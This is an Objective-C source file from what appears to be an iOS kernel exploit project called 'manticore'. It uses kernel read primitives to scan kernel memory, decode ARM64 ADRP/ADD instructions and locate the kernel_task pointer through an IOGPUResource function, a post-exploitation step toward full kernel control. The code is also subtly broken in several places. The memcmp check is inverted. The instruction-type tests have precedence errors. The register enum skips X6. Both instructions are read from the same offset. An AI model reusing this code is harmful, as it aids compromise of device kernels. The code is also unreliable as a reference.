//
//  task_finder.m
//  manticore
//
//  Created by 21 on 02.03.21.
//

#import <Foundation/Foundation.h>

#include "../Exploit/exploit_main.h"
#include "task_finder.h"
#include <stdbool.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

typedef uint64_t kptr_t;

extern void kapi_read(kptr_t addr, void *data, size_t len);
extern uint32_t kapi_read32(kptr_t addr);
extern uint64_t kapi_read64(kptr_t addr);

/* wrappers for future proofing */
void        _kread(void *p, char *r, size_t n)  { return kapi_read((kptr_t)p, (void *)r, n); }
uint64_t    _kread_32(void *p)                  { return kapi_read32((kptr_t)p); }
uint64_t    _kread_64(void *p)                  { return kapi_read64((kptr_t)p); }

/****** BMH ALGORITHM ******/
/* https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore%E2%80%93Horspool_algorithm */

void _bmh_table_gen(char const *needle, const size_t needle_len,
                    int table[]) {
    for (int i = 0; i < 256; i++) table[i] = needle_len;
    for (int i = 0; i < needle_len - 1; i++)
        table[needle[i]] = needle_len - 1 - i;
}

size_t bmh_search(char const * restrict needle, const size_t needle_len,
                char const * restrict haystack, const size_t haystack_len) {
    int table[256] = {0};
    _bmh_table_gen(needle, needle_len, table);

    unsigned char *temp = (unsigned char *)malloc(needle_len);

    int skip = 0;
    while (haystack_len - skip >= needle_len) {
        _kread((void *)&haystack[skip], (char *)temp, needle_len);
        if (memcmp(temp, needle, needle_len))
            return skip;
        skip += table[haystack[skip + needle_len - 1]];
    }

    return 0;
}

/****** aarch64 fuckery ******/
typedef uint32_t aarch64_insn_t;
typedef uint64_t u64;
typedef uint32_t u32;

enum aarch64_reg {
    X0, X1, X2, X3, X4, X5, X7, X8, X9,
    X10, X11, X12, X13, X14, X15, X16,
    X17, X18, X19, X20, X21, X22, X23,
    X24, X25, X26, X27, X28, X29, X30,
    X31
};

enum aarch64_insn_type {
    UNK, ADRP, ADD
};

/* starting to regret not using capstone */
enum aarch64_insn_type get_insn_type(aarch64_insn_t insn) {
    if (insn & 0x9F000000 == 0x90000000) return ADRP;
    if (insn & 0xFF000000 == 0x91000000) return ADD;
    else return UNK;
}

u64 _extract_adrp_imm(aarch64_insn_t insn) {
    /* extract immhi:immlo from adrp */
    u32 immhi = insn & 0xFFFFE0;
    immhi >>= 5;
    immhi <<= 2;

    u32 immlo = insn & 0x60000000;
    immlo >>= 29;

    u64 imm = immhi | immlo;
    imm <<= 12; /* mul 4096 */

    return imm;
}

u32 _extract_add_imm(aarch64_insn_t insn) {
    u32 imm = insn & 0x3FFC00;
    imm >>= 10;
    return imm;
}

void *find_xref_to(void *ref, void *haystack, void *from, void *to) {
    /* insn align */
    from = (void *)((u64)from & ~3);
    to = (void *)((u64)to & ~3);

    aarch64_insn_t cur_insn;
    while (from < to) {
        cur_insn = _kread_32((void *)((u64)haystack + (u64)from));
        switch (get_insn_type(cur_insn)) {
            case ADRP:;
                u64 imm = _extract_adrp_imm(cur_insn);

                /* check if the next insn is an ADD */
                cur_insn = _kread_32((void *)((u64)haystack + (u64)from + 4));
                if (get_insn_type(cur_insn) != ADD)
                    break;

                imm |= _extract_add_imm(cur_insn);

                if (imm == (u64)ref)
                    return (void *)((u64)haystack + (u64)from);

                break;

            default:
                break;
        }

        /* next insn */
        from += 4;
    }

    return NULL;
}

/****** kernel_task finder ******/

// string to match
static const char *_IOGPUResource = "static IOGPUResource *IOGPUResource::newResourceWithOptions(IOGPU *, IOGPUDevice *, enum eIOGPUResType, uint64_t, IOByteCount, IOOptionBits, mach_vm_address_t *, IOGPUNewResourceArgs *)";
// address of ^
kptr_t p_IOGPUResource = 0;

kptr_t p_kernel_base = 0xFFFFFFF007004000;
size_t v_kernel_size = 0x0000000003000000; // this is almost guaranteed to go beyond end of kernel


//kptr_t *kernel_base_ptr;
uint64_t kbase_value() {
    return *kernel_base_ptr != 0 ? *kernel_base_ptr : -1;
}

kptr_t get_kernel_task(void *kbase, size_t ksize) {
    // p_kernel_base should be fine, but i'm not 100% sure
    if (!kbase) kbase = (void *)p_kernel_base;
    if (!ksize) ksize = v_kernel_size;

    static const unsigned char prologue_iogpuresource[] = {
        0xE6, 0x03, 0x05, 0xAA,     /* MOV      X6, X5 */
        0xE5, 0x03, 0x04, 0xAA,     /* MOV      X5, X4 */
        0xE4, 0x03, 0x03, 0xAA,     /* MOV      X4, X3 */
        0x03, 0x00, 0x80, 0xD2,     /* MOV      X3, #0 */
        0x07, 0x00, 0x80, 0xD2,     /* MOV      X7, #0 */
    };

    p_IOGPUResource = bmh_search(
                        _IOGPUResource, strlen(_IOGPUResource),
                        kbase, ksize) + (kptr_t) kbase;

    /* IOGPUResource::newResourceWithOptions */
    /* that same function has kernel_task at +D0 */
    kptr_t func_iogpuresource = (kptr_t)find_xref_to((void *)p_IOGPUResource, kbase, 0, (void *)v_kernel_size);
    /* backtrack to function prologue */
    func_iogpuresource = (kptr_t) bmh_search(
                            prologue_iogpuresource, sizeof(prologue_iogpuresource),
                            (const char *)(func_iogpuresource - 0xF0), 0x500); /* 0x500 is way overshooting it as is */
    
    /* extract kernel_task from:
     * ADRP     X8, #_kernel_task@PAGE
     * ADD      X8, X8, #_kernel_task@PAGEOFF */
    aarch64_insn_t adrp_ktask = *((aarch64_insn_t *) (func_iogpuresource + 0xD0));
    aarch64_insn_t add_ktask = *((aarch64_insn_t *) (func_iogpuresource + 0xD0));
    
    kptr_t kernel_task = _extract_adrp_imm(adrp_ktask) | _extract_add_imm(add_ktask);
    return kernel_task;
}
